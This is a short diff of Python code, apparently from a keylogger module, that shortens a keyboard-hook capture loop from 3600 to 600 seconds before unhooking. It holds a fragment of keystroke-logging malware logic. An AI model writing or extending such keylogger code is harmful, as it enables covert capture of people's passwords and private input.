@@ -83,7 +83,7 @@ def run(**args):
     cur_time = start_time
     log = ''
     k1.HookKeyboard()
-    while cur_time - start_time < 3600:
+    while cur_time - start_time < 600:
         pythoncom.PumpWaitingMessages()
         cur_time = time.time()
     k1.UnhookKeyboard()
